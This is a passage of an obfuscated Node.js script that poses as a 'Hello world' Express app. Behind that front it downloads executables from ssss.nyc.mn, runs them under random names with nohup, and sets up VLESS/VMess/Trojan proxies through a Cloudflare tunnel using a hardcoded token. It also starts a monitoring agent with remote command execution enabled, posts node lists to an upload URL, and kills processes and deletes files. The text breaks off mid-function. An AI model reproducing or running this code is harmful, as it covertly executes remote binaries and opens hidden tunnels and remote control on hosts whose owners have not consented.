function _0x5f19(_0x3a3353,_0x5bd61e){const _0x26bf27=_0x26bf();return _0x5f19=function(_0x5f1953,_0x218c3b){_0x5f1953=_0x5f1953-0x13d;let _0x458830=_0x26bf27[_0x5f1953];return _0x458830;},_0x5f19(_0x3a3353,_0x5bd61e);}function _0x26bf(){const _0xb9b1f5=['destOverride','sniffing','fileName','tunnel.json','tag','countryCode','\x0aclient_secret:\x20','2148815hpTDBg','/dev/null','basename','responseType','dest','subscription','NEZHA_KEY','error','settings','\x20successfully','url','\x20-c\x20\x22','scy','Subscription\x20uploaded\x20successfully','success','\x20is\x20running','application/json','type','all','utf-8','Error\x20executing\x20command:\x20','Error\x20in\x20startserver:','unlinkSync','NEZHA_SERVER','144383crunkp','--tls','push','taskkill\x20/f\x20/im\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','blackhole','/config.json\x20>/dev/null\x202>&1\x20&','log','UUID','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','listen','true','readdirSync','existsSync','\x20>/dev/null\x202>&1','false','/sub.txt\x20saved\x20successfully','substring','charAt','port','/vmess-argo?ed=2560','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Error\x20downloading\x20files:','config.json','clients','ARGO_DOMAIN:','/vless-argo','443','https://arm64.ssss.nyc.mn/web','length','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','clear','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/api/add-nodes','tunnel.yml','split','test','filter','vmess','http://ip-api.com/json/','createWriteStream','https://ipapi.co/json/','kuan','platform','vless','CFIP','1164184eISiyZ','enabled','from','catch','2096','120380tYXgUJ','\x20>/dev/null\x202>&1\x20&','host','fu258369','servers','readFileSync','join','sni','timeout','then','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','stringify','pop','country_code','Unhandled\x20error\x20in\x20startserver:','TunnelSecret','child_process','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x0avmess://','127.0.0.1','text/plain;\x20charset=utf-8','isFile','status','forEach','arm64','2053','App\x20is\x20running','SUB_PATH','net','\x20>\x20nul\x202>&1','nohup\x20','response','nodes','list.txt','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https+local://8.8.8.8/dns-query','env','send','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20\x20\x20','dns','ARGO_DOMAIN','4YwRuNf','boot.log','win32','sub.txt','CFPORT','org','Nodes\x20uploaded\x20successfully','recursive','ARGO_PORT','amd','post','automatic\x20access\x20task\x20added\x20successfully','eyJhIjoiYzZjYjc4NDJiZjM0NDQ3ZGRmZjUyNjAyYTE2ZDVlMWEiLCJ0IjoiMDVjZDIwYjMtZDlhOC00YWU3LTg0ODgtOTY4MzA0Nzk3OWQyIiwicyI6Ik5Ea3haREptTURVdE9HWmxZaTAwWlRsbExUaGtPRGt0T1dGaE1qSmxNV0prWkdGaSJ9','2083','decryption','config.yaml','abcdefghijklmnopqrstuvwxyz','PROJECT_URL','171038HdURbK','crbvinmnqpyv.us-west-1.clawcloudrun.com:80','get','metadataOnly','8443','/trojan-argo','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x22\x20>\x20/dev/null\x202>&1','aarch64','has','random','https://oooo.serv00.net/add-url','NEZHA_PORT','tcp','fallbacks','NEZHA\x20variable\x20is\x20empty,skip\x20running','lea.hun93.cloudns.biz','streamSettings','fileUrl','map','https://amd64.ssss.nyc.mn/web','path','tls','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','headers','unshift','base64','15DscCPH','npm\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Content-Type','UPLOAD_URL','.exe\x20>\x20nul\x202>&1','password','protocol','http','web\x20running\x20error:\x20','security','toString','network','SERVER_PORT','writeFileSync','/vmess-argo','none','alterId','freedom','statSync','https://arm64.ssss.nyc.mn/agent','data','alpn','wsSettings','arm','ArgoDomain:','add','includes','direct','trojan','loglevel','Download\x20','Empowerment\x20failed\x20for\x20','xtls-rprx-vision','1652934rqDREo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://arm64.ssss.nyc.mn/v1','Empowerment\x20success\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','quic','\x0a\x20\x20tunnel:\x20','message','match','?encryption=none&security=tls&sni=','mkdirSync','7ff3e2e5-4234-4e26-b6b6-cf24d9c7b8b8','rm\x20-rf\x20','express','?security=tls&sni=','finish','Unknown','\x20-p\x20','outbounds','&path=%2Fvless-argo%3Fed%3D2560#','/tunnel.yml\x20run','Add\x20automatic\x20access\x20task\x20faild:\x20','&fp=firefox&type=ws&host=','961470paohVv','set','\x0a\x0atrojan://','Skipping\x20adding\x20automatic\x20access\x20task','axios'];_0x26bf=function(){return _0xb9b1f5;};return _0x26bf();}const _0x2793bb=_0x5f19;(function(_0x22cd83,_0x2729bd){const _0x1baf24=_0x5f19,_0x1c3462=_0x22cd83();while(!![]){try{const _0x54cb77=-parseInt(_0x1baf24(0x1de))/0x1*(-parseInt(_0x1baf24(0x154))/0x2)+-parseInt(_0x1baf24(0x181))/0x3*(parseInt(_0x1baf24(0x211))/0x4)+parseInt(_0x1baf24(0x1c6))/0x5+-parseInt(_0x1baf24(0x1a3))/0x6+parseInt(_0x1baf24(0x166))/0x7+-parseInt(_0x1baf24(0x20c))/0x8+parseInt(_0x1baf24(0x1ba))/0x9;if(_0x54cb77===_0x2729bd)break;else _0x1c3462['push'](_0x1c3462['shift']());}catch(_0x56e22b){_0x1c3462['push'](_0x1c3462['shift']());}}}(_0x26bf,0x43f22));const express=require(_0x2793bb(0x1b0)),app=express(),axios=require(_0x2793bb(0x1be)),os=require('os'),fs=require('fs'),path=require(_0x2793bb(0x17b)),{promisify}=require('util'),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x2793bb(0x221)),UPLOAD_URL=process[_0x2793bb(0x14e)][_0x2793bb(0x185)]||'',PROJECT_URL=process[_0x2793bb(0x14e)][_0x2793bb(0x165)]||'',AUTO_ACCESS=process[_0x2793bb(0x14e)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2793bb(0x14e)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x2793bb(0x14e)][_0x2793bb(0x145)]||_0x2793bb(0x214),PORT=process[_0x2793bb(0x14e)][_0x2793bb(0x18e)]||process['env']['PORT']||0xbb8,UUID=process[_0x2793bb(0x14e)][_0x2793bb(0x1e6)]||_0x2793bb(0x1ae),NEZHA_SERVER=process[_0x2793bb(0x14e)][_0x2793bb(0x1dd)]||_0x2793bb(0x167),NEZHA_PORT=process[_0x2793bb(0x14e)][_0x2793bb(0x172)]||'',NEZHA_KEY=process[_0x2793bb(0x14e)][_0x2793bb(0x1cc)]||'',ARGO_DOMAIN=process[_0x2793bb(0x14e)][_0x2793bb(0x153)]||_0x2793bb(0x176),ARGO_AUTH=process[_0x2793bb(0x14e)]['ARGO_AUTH']||_0x2793bb(0x160),ARGO_PORT=process[_0x2793bb(0x14e)][_0x2793bb(0x15c)]||0x1406,CFIP=process[_0x2793bb(0x14e)][_0x2793bb(0x20b)]||'cdns.doon.eu.org',CFPORT=process[_0x2793bb(0x14e)][_0x2793bb(0x158)]||0x1bb,NAME=process[_0x2793bb(0x14e)]['NAME']||_0x2793bb(0x208);!fs[_0x2793bb(0x1eb)](FILE_PATH)?(fs[_0x2793bb(0x1ad)](FILE_PATH),console[_0x2793bb(0x1e5)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x59b982=_0x2793bb,_0x2c4a2a=_0x59b982(0x164);let _0xa046ad='';for(let _0x3b0839=0x0;_0x3b0839<0x6;_0x3b0839++){_0xa046ad+=_0x2c4a2a[_0x59b982(0x1f0)](Math['floor'](Math[_0x59b982(0x170)]()*_0x2c4a2a[_0x59b982(0x1fb)]));}return _0xa046ad;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2793bb(0x217)](FILE_PATH,npmName),phpPath=path[_0x2793bb(0x217)](FILE_PATH,phpName),webPath=path[_0x2793bb(0x217)](FILE_PATH,webName),botPath=path[_0x2793bb(0x217)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x2793bb(0x157)),listPath=path[_0x2793bb(0x217)](FILE_PATH,_0x2793bb(0x14b)),bootLogPath=path[_0x2793bb(0x217)](FILE_PATH,'boot.log'),configPath=path[_0x2793bb(0x217)](FILE_PATH,_0x2793bb(0x1f5));function deleteNodes(){const _0x31d94c=_0x2793bb;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x49a65e;try{_0x49a65e=fs['readFileSync'](subPath,_0x31d94c(0x1d9));}catch{return null;}const _0x317f12=Buffer[_0x31d94c(0x20e)](_0x49a65e,_0x31d94c(0x180))['toString'](_0x31d94c(0x1d9)),_0x29ab2c=_0x317f12[_0x31d94c(0x201)]('\x0a')[_0x31d94c(0x203)](_0x5cbe8f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x31d94c(0x202)](_0x5cbe8f));if(_0x29ab2c[_0x31d94c(0x1fb)]===0x0)return;const _0x10049a={};_0x10049a[_0x31d94c(0x14a)]=_0x29ab2c;const _0x23fad1={};_0x23fad1[_0x31d94c(0x184)]=_0x31d94c(0x1d6);const _0x283adf={};return _0x283adf[_0x31d94c(0x17e)]=_0x23fad1,axios[_0x31d94c(0x15e)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify'](_0x10049a),_0x283adf)['catch'](_0x44b610=>{return null;}),null;}catch(_0x2f9d41){return null;}}function cleanupOldFiles(){const _0x57f8d3=_0x2793bb;try{const _0x20e355=fs[_0x57f8d3(0x1ea)](FILE_PATH);_0x20e355[_0x57f8d3(0x141)](_0x3dbc5c=>{const _0x95d6f1=_0x57f8d3,_0x4a05ed=path[_0x95d6f1(0x217)](FILE_PATH,_0x3dbc5c);try{const _0x1b48ec=fs[_0x95d6f1(0x194)](_0x4a05ed);_0x1b48ec[_0x95d6f1(0x13f)]()&&fs[_0x95d6f1(0x1dc)](_0x4a05ed);}catch(_0x5e87b1){}});}catch(_0x4d9641){}}app[_0x2793bb(0x168)]('/',function(_0x3d774d,_0x57e9d8){const _0x597c35=_0x2793bb;_0x57e9d8[_0x597c35(0x14f)]('Hello\x20world!');});async function generateConfig(){const _0x4b8388=_0x2793bb,_0x177122={};_0x177122['access']=_0x4b8388(0x1c7),_0x177122[_0x4b8388(0x1cd)]=_0x4b8388(0x1c7),_0x177122[_0x4b8388(0x19f)]=_0x4b8388(0x191);const _0x5261be={};_0x5261be['id']=UUID,_0x5261be['flow']=_0x4b8388(0x1a2);const _0x210781={};_0x210781[_0x4b8388(0x1ca)]=0xbb9;const _0xb2ed8b={};_0xb2ed8b['path']='/vless-argo',_0xb2ed8b[_0x4b8388(0x1ca)]=0xbba;const _0x1ed247={};_0x1ed247[_0x4b8388(0x17b)]='/vmess-argo',_0x1ed247[_0x4b8388(0x1ca)]=0xbbb;const _0x5b2a52={};_0x5b2a52[_0x4b8388(0x17b)]=_0x4b8388(0x16b),_0x5b2a52[_0x4b8388(0x1ca)]=0xbbc;const _0x3770fa={};_0x3770fa[_0x4b8388(0x1f6)]=[_0x5261be],_0x3770fa[_0x4b8388(0x162)]=_0x4b8388(0x191),_0x3770fa[_0x4b8388(0x174)]=[_0x210781,_0xb2ed8b,_0x1ed247,_0x5b2a52];const _0x587a80={};_0x587a80[_0x4b8388(0x18d)]=_0x4b8388(0x173);const _0x2f13d4={};_0x2f13d4['port']=ARGO_PORT,_0x2f13d4[_0x4b8388(0x188)]='vless',_0x2f13d4[_0x4b8388(0x1ce)]=_0x3770fa,_0x2f13d4[_0x4b8388(0x177)]=_0x587a80;const _0x2214e8={};_0x2214e8['id']=UUID;const _0x14f0cf={};_0x14f0cf[_0x4b8388(0x1f6)]=[_0x2214e8],_0x14f0cf[_0x4b8388(0x162)]=_0x4b8388(0x191);const _0x482b15={};_0x482b15[_0x4b8388(0x18d)]=_0x4b8388(0x173),_0x482b15[_0x4b8388(0x18b)]='none';const _0x169d1d={};_0x169d1d[_0x4b8388(0x1f1)]=0xbb9,_0x169d1d[_0x4b8388(0x1e8)]='127.0.0.1',_0x169d1d[_0x4b8388(0x188)]='vless',_0x169d1d['settings']=_0x14f0cf,_0x169d1d['streamSettings']=_0x482b15;const _0x29b72c={};_0x29b72c['id']=UUID,_0x29b72c['level']=0x0;const _0x1a736d={};_0x1a736d[_0x4b8388(0x1f6)]=[_0x29b72c],_0x1a736d['decryption']=_0x4b8388(0x191);const _0x1a822f={};_0x1a822f[_0x4b8388(0x17b)]=_0x4b8388(0x1f8);const _0x156361={};_0x156361[_0x4b8388(0x18d)]='ws',_0x156361['security']=_0x4b8388(0x191),_0x156361[_0x4b8388(0x198)]=_0x1a822f;const _0x4d0289={};_0x4d0289[_0x4b8388(0x20d)]=!![],_0x4d0289[_0x4b8388(0x1bf)]=['http',_0x4b8388(0x17c),_0x4b8388(0x1a8)],_0x4d0289[_0x4b8388(0x169)]=![];const _0x1e615e={};_0x1e615e[_0x4b8388(0x1f1)]=0xbba,_0x1e615e[_0x4b8388(0x1e8)]=_0x4b8388(0x13d),_0x1e615e['protocol']=_0x4b8388(0x20a),_0x1e615e[_0x4b8388(0x1ce)]=_0x1a736d,_0x1e615e['streamSettings']=_0x156361,_0x1e615e[_0x4b8388(0x1c0)]=_0x4d0289;const _0x33d915={};_0x33d915['id']=UUID,_0x33d915[_0x4b8388(0x192)]=0x0;const _0x309112={};_0x309112[_0x4b8388(0x1f6)]=[_0x33d915];const _0x5d0979={};_0x5d0979[_0x4b8388(0x17b)]=_0x4b8388(0x190);const _0x5304cc={};_0x5304cc[_0x4b8388(0x18d)]='ws',_0x5304cc[_0x4b8388(0x198)]=_0x5d0979;const _0x459d4b={};_0x459d4b[_0x4b8388(0x20d)]=!![],_0x459d4b[_0x4b8388(0x1bf)]=[_0x4b8388(0x189),_0x4b8388(0x17c),_0x4b8388(0x1a8)],_0x459d4b['metadataOnly']=![];const _0x4ea9d2={};_0x4ea9d2[_0x4b8388(0x1f1)]=0xbbb,_0x4ea9d2[_0x4b8388(0x1e8)]=_0x4b8388(0x13d),_0x4ea9d2[_0x4b8388(0x188)]=_0x4b8388(0x204),_0x4ea9d2['settings']=_0x309112,_0x4ea9d2['streamSettings']=_0x5304cc,_0x4ea9d2[_0x4b8388(0x1c0)]=_0x459d4b;const _0x2a976f={};_0x2a976f[_0x4b8388(0x187)]=UUID;const _0xdf5d4c={};_0xdf5d4c['clients']=[_0x2a976f];const _0x5d3433={};_0x5d3433['path']=_0x4b8388(0x16b);const _0xbe34f={};_0xbe34f['network']='ws',_0xbe34f[_0x4b8388(0x18b)]=_0x4b8388(0x191),_0xbe34f[_0x4b8388(0x198)]=_0x5d3433;const _0x1ab9d0={};_0x1ab9d0['enabled']=!![],_0x1ab9d0[_0x4b8388(0x1bf)]=[_0x4b8388(0x189),'tls',_0x4b8388(0x1a8)],_0x1ab9d0['metadataOnly']=![];const _0x20054e={};_0x20054e[_0x4b8388(0x1f1)]=0xbbc,_0x20054e['listen']=_0x4b8388(0x13d),_0x20054e[_0x4b8388(0x188)]=_0x4b8388(0x19e),_0x20054e[_0x4b8388(0x1ce)]=_0xdf5d4c,_0x20054e[_0x4b8388(0x177)]=_0xbe34f,_0x20054e[_0x4b8388(0x1c0)]=_0x1ab9d0;const _0x383c5a={};_0x383c5a[_0x4b8388(0x215)]=[_0x4b8388(0x14d)];const _0x1f980e={};_0x1f980e[_0x4b8388(0x188)]=_0x4b8388(0x193),_0x1f980e[_0x4b8388(0x1c3)]=_0x4b8388(0x19d);const _0x151224={};_0x151224['protocol']=_0x4b8388(0x1e3),_0x151224[_0x4b8388(0x1c3)]='block';const _0x3cea05={};_0x3cea05[_0x4b8388(0x1e5)]=_0x177122,_0x3cea05['inbounds']=[_0x2f13d4,_0x169d1d,_0x1e615e,_0x4ea9d2,_0x20054e],_0x3cea05[_0x4b8388(0x152)]=_0x383c5a,_0x3cea05[_0x4b8388(0x1b5)]=[_0x1f980e,_0x151224];const _0x2c56ff=_0x3cea05;fs['writeFileSync'](path[_0x4b8388(0x217)](FILE_PATH,_0x4b8388(0x1f5)),JSON[_0x4b8388(0x21c)](_0x2c56ff,null,0x2));}function getSystemArchitecture(){const _0x23caea=_0x2793bb,_0x22248e=os['arch']();return _0x22248e===_0x23caea(0x199)||_0x22248e===_0x23caea(0x142)||_0x22248e===_0x23caea(0x16e)?_0x23caea(0x199):_0x23caea(0x15d);}function downloadFile(_0x166b15,_0x24d86a,_0x4e3abb){const _0x1951f1=_0x2793bb,_0x466abd=_0x166b15;if(!fs[_0x1951f1(0x1eb)](FILE_PATH)){const _0x36082f={};_0x36082f[_0x1951f1(0x15b)]=!![],fs[_0x1951f1(0x1ad)](FILE_PATH,_0x36082f);}const _0x22e598=fs[_0x1951f1(0x206)](_0x466abd),_0x18cb83={};_0x18cb83['method']='get',_0x18cb83[_0x1951f1(0x1d0)]=_0x24d86a,_0x18cb83[_0x1951f1(0x1c9)]='stream',axios(_0x18cb83)[_0x1951f1(0x21a)](_0x49466c=>{const _0x569eee=_0x1951f1;_0x49466c[_0x569eee(0x196)]['pipe'](_0x22e598),_0x22e598['on'](_0x569eee(0x1b2),()=>{const _0x4c85e6=_0x569eee;_0x22e598['close'](),console[_0x4c85e6(0x1e5)](_0x4c85e6(0x1a0)+path[_0x4c85e6(0x1c8)](_0x466abd)+_0x4c85e6(0x1cf)),_0x4e3abb(null,_0x466abd);}),_0x22e598['on']('error',_0x5df53d=>{const _0x3bd241=_0x569eee;fs['unlink'](_0x466abd,()=>{});const _0x526213=_0x3bd241(0x1a0)+path[_0x3bd241(0x1c8)](_0x466abd)+'\x20failed:\x20'+_0x5df53d['message'];console['error'](_0x526213),_0x4e3abb(_0x526213);});})[_0x1951f1(0x20f)](_0x2cde41=>{const _0x41f8c1=_0x1951f1,_0x290ddb=_0x41f8c1(0x1a0)+path['basename'](_0x466abd)+'\x20failed:\x20'+_0x2cde41['message'];console[_0x41f8c1(0x1cd)](_0x290ddb),_0x4e3abb(_0x290ddb);});}async function downloadFilesAndRun(){const _0xebcba0=_0x2793bb,_0x2343c6=getSystemArchitecture(),_0x5d77ef=getFilesForArchitecture(_0x2343c6);if(_0x5d77ef[_0xebcba0(0x1fb)]===0x0){console[_0xebcba0(0x1e5)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x324b14=_0x5d77ef[_0xebcba0(0x179)](_0x3f165d=>{return new Promise((_0xceba66,_0x506b38)=>{downloadFile(_0x3f165d['fileName'],_0x3f165d['fileUrl'],(_0x10a728,_0x2f8b6b)=>{_0x10a728?_0x506b38(_0x10a728):_0xceba66(_0x2f8b6b);});});});try{await Promise[_0xebcba0(0x1d8)](_0x324b14);}catch(_0x2a5d2b){console['error'](_0xebcba0(0x1f4),_0x2a5d2b);return;}function _0x4f438c(_0x34f427){const _0x13ea8a=_0xebcba0,_0x3b3ea3=0x1fd;_0x34f427[_0x13ea8a(0x141)](_0x51960e=>{const _0x4978a6=_0x13ea8a;fs[_0x4978a6(0x1eb)](_0x51960e)&&fs['chmod'](_0x51960e,_0x3b3ea3,_0x38b466=>{const _0x400e6a=_0x4978a6;_0x38b466?console[_0x400e6a(0x1cd)](_0x400e6a(0x1a1)+_0x51960e+':\x20'+_0x38b466):console['log'](_0x400e6a(0x1a6)+_0x51960e+':\x20'+_0x3b3ea3['toString'](0x8));});});}const _0x1d0944=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4f438c(_0x1d0944);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40384e=NEZHA_SERVER[_0xebcba0(0x19c)](':')?NEZHA_SERVER['split'](':')[_0xebcba0(0x21d)]():'',_0x329a1f=new Set(['443',_0xebcba0(0x16a),'2096','2087',_0xebcba0(0x161),'2053']),_0x21f830=_0x329a1f[_0xebcba0(0x16f)](_0x40384e)?_0xebcba0(0x1e9):_0xebcba0(0x1ed),_0x4ba9c0=_0xebcba0(0x1c5)+NEZHA_KEY+_0xebcba0(0x16c)+NEZHA_SERVER+_0xebcba0(0x21b)+_0x21f830+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0xebcba0(0x18f)](path['join'](FILE_PATH,_0xebcba0(0x163)),_0x4ba9c0);const _0x2a5c20='nohup\x20'+phpPath+_0xebcba0(0x1d1)+FILE_PATH+_0xebcba0(0x1fc);try{await exec(_0x2a5c20),console[_0xebcba0(0x1e5)](phpName+'\x20is\x20running'),await new Promise(_0xee235=>setTimeout(_0xee235,0x3e8));}catch(_0x171f66){console[_0xebcba0(0x1cd)]('php\x20running\x20error:\x20'+_0x171f66);}}else{let _0x4193ed='';const _0x586a0f=[_0xebcba0(0x1f9),'8443',_0xebcba0(0x210),'2087','2083',_0xebcba0(0x143)];_0x586a0f['includes'](NEZHA_PORT)&&(_0x4193ed=_0xebcba0(0x1df));const _0x31b330=_0xebcba0(0x148)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xebcba0(0x1b4)+NEZHA_KEY+'\x20'+_0x4193ed+_0xebcba0(0x1e7);try{await exec(_0x31b330),console[_0xebcba0(0x1e5)](npmName+_0xebcba0(0x1d5)),await new Promise(_0x3aa2a7=>setTimeout(_0x3aa2a7,0x3e8));}catch(_0x5b2dfb){console['error'](_0xebcba0(0x182)+_0x5b2dfb);}}}else console[_0xebcba0(0x1e5)](_0xebcba0(0x175));const _0x54ddda=_0xebcba0(0x148)+webPath+'\x20-c\x20'+FILE_PATH+_0xebcba0(0x1e4);try{await exec(_0x54ddda),console[_0xebcba0(0x1e5)](webName+'\x20is\x20running'),await new Promise(_0xaf35c6=>setTimeout(_0xaf35c6,0x3e8));}catch(_0x48db02){console['error'](_0xebcba0(0x18a)+_0x48db02);}if(fs[_0xebcba0(0x1eb)](botPath)){let _0x266545;if(ARGO_AUTH[_0xebcba0(0x1ab)](/^[A-Z0-9a-z=]{120,250}$/))_0x266545='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0xebcba0(0x1ab)](/TunnelSecret/)?_0x266545=_0xebcba0(0x1fe)+FILE_PATH+_0xebcba0(0x1b7):_0x266545=_0xebcba0(0x1a7)+FILE_PATH+_0xebcba0(0x1a4)+ARGO_PORT;try{await exec(_0xebcba0(0x148)+botPath+'\x20'+_0x266545+_0xebcba0(0x212)),console[_0xebcba0(0x1e5)](botName+'\x20is\x20running'),await new Promise(_0x385367=>setTimeout(_0x385367,0x7d0));}catch(_0x6dcf57){console[_0xebcba0(0x1cd)](_0xebcba0(0x1da)+_0x6dcf57);}}await new Promise(_0x25a998=>setTimeout(_0x25a998,0x1388));}function getFilesForArchitecture(_0x4bcc5f){const _0x25dbbb=_0x2793bb;let _0x133d33;if(_0x4bcc5f===_0x25dbbb(0x199)){const _0x6ac2cf={};_0x6ac2cf[_0x25dbbb(0x1c1)]=webPath,_0x6ac2cf[_0x25dbbb(0x178)]=_0x25dbbb(0x1fa);const _0x58430e={};_0x58430e[_0x25dbbb(0x1c1)]=botPath,_0x58430e[_0x25dbbb(0x178)]=_0x25dbbb(0x150),_0x133d33=[_0x6ac2cf,_0x58430e];}else{const _0x1807cb={};_0x1807cb['fileName']=webPath,_0x1807cb[_0x25dbbb(0x178)]=_0x25dbbb(0x17a);const _0x319dce={};_0x319dce[_0x25dbbb(0x1c1)]=botPath,_0x319dce[_0x25dbbb(0x178)]='https://amd64.ssss.nyc.mn/bot',_0x133d33=[_0x1807cb,_0x319dce];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x209cb5=_0x4bcc5f===_0x25dbbb(0x199)?_0x25dbbb(0x195):'https://amd64.ssss.nyc.mn/agent',_0x5e6ea6={};_0x5e6ea6[_0x25dbbb(0x1c1)]=npmPath,_0x5e6ea6[_0x25dbbb(0x178)]=_0x209cb5,_0x133d33[_0x25dbbb(0x17f)](_0x5e6ea6);}else{const _0x208cac=_0x4bcc5f===_0x25dbbb(0x199)?_0x25dbbb(0x1a5):'https://amd64.ssss.nyc.mn/v1',_0x297693={};_0x297693[_0x25dbbb(0x1c1)]=phpPath,_0x297693[_0x25dbbb(0x178)]=_0x208cac,_0x133d33[_0x25dbbb(0x17f)](_0x297693);}}return _0x133d33;}function argoType(){const _0x4fec0c=_0x2793bb;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4fec0c(0x1e5)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4fec0c(0x19c)](_0x4fec0c(0x220))){fs['writeFileSync'](path['join'](FILE_PATH,_0x4fec0c(0x1c2)),ARGO_AUTH);const _0x1a5247=_0x4fec0c(0x1a9)+ARGO_AUTH[_0x4fec0c(0x201)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x4fec0c(0x217)](FILE_PATH,_0x4fec0c(0x1c2))+_0x4fec0c(0x14c)+ARGO_DOMAIN+_0x4fec0c(0x17d)+ARGO_PORT+_0x4fec0c(0x183);fs[_0x4fec0c(0x18f)](path[_0x4fec0c(0x217)](FILE_PATH,_0x4fec0c(0x200)),_0x1a5247);}else console[_0x4fec0c(0x1e5)](_0x4fec0c(0x1f3));}async function extractDomains(){const _0x2fa854=_0x2793bb;let _0x315315;if(ARGO_AUTH&&ARGO_DOMAIN)_0x315315=ARGO_DOMAIN,console[_0x2fa854(0x1e5)](_0x2fa854(0x1f7),_0x315315),await _0x4bad5f(_0x315315);else try{const _0x580ca0=fs[_0x2fa854(0x216)](path[_0x2fa854(0x217)](FILE_PATH,_0x2fa854(0x155)),'utf-8'),_0x797245=_0x580ca0[_0x2fa854(0x201)]('\x0a'),_0x20fd99=[];_0x797245[_0x2fa854(0x141)](_0x366775=>{const _0x1dee82=_0x2fa854,_0x51a0fb=_0x366775[_0x1dee82(0x1ab)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x51a0fb){const _0x5d6bc7=_0x51a0fb[0x1];_0x20fd99['push'](_0x5d6bc7);}});if(_0x20fd99[_0x2fa854(0x1fb)]>0x0)_0x315315=_0x20fd99[0x0],console['log'](_0x2fa854(0x19a),_0x315315),await _0x4bad5f(_0x315315);else{console[_0x2fa854(0x1e5)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x2fa854(0x217)](FILE_PATH,_0x2fa854(0x155)));async function _0x34b594(){const _0xa29ab2=_0x2fa854;try{process[_0xa29ab2(0x209)]===_0xa29ab2(0x156)?await exec(_0xa29ab2(0x1e1)+botName+_0xa29ab2(0x186)):await exec('pkill\x20-f\x20\x22['+botName[_0xa29ab2(0x1f0)](0x0)+']'+botName[_0xa29ab2(0x1ef)](0x1)+_0xa29ab2(0x16d));}catch(_0x4ceb7b){}}_0x34b594(),await new Promise(_0x1e2608=>setTimeout(_0x1e2608,0xbb8));const _0x1afc56=_0x2fa854(0x1a7)+FILE_PATH+_0x2fa854(0x1a4)+ARGO_PORT;try{await exec(_0x2fa854(0x148)+botPath+'\x20'+_0x1afc56+_0x2fa854(0x212)),console[_0x2fa854(0x1e5)](botName+_0x2fa854(0x1d5)),await new Promise(_0x2e70a7=>setTimeout(_0x2e70a7,0xbb8)),await extractDomains();}catch(_0x17ab57){console[_0x2fa854(0x1cd)]('Error\x20executing\x20command:\x20'+_0x17ab57);}}}catch(_0x4ed7f3){console[_0x2fa854(0x1cd)]('Error\x20reading\x20boot.log:',_0x4ed7f3);}async function _0x1b0a8b(){const _0x253ac4=_0x2fa854;try{const _0x17b791={};_0x17b791[_0x253ac4(0x219)]=0xbb8;const _0x4b7155=await axios[_0x253ac4(0x168)](_0x253ac4(0x207),_0x17b791);if(_0x4b7155[_0x253ac4(0x196)]&&_0x4b7155[_0x253ac4(0x196)][_0x253ac4(0x21e)]&&_0x4b7155['data'][_0x253ac4(0x159)])return _0x4b7155[_0x253ac4(0x196)]['country_code']+'_'+_0x4b7155[_0x253ac4(0x196)][_0x253ac4(0x159)];}catch(_0x5cd59f){try{const _0x47ec2c={};_0x47ec2c[_0x253ac4(0x219)]=0xbb8;const _0x5d6db5=await axios[_0x253ac4(0x168)](_0x253ac4(0x205),_0x47ec2c);if(_0x5d6db5[_0x253ac4(0x196)]&&_0x5d6db5[_0x253ac4(0x196)][_0x253ac4(0x140)]===_0x253ac4(0x1d4)&&_0x5d6db5[_0x253ac4(0x196)][_0x253ac4(0x1c4)]&&_0x5d6db5[_0x253ac4(0x196)][_0x253ac4(0x159)])return 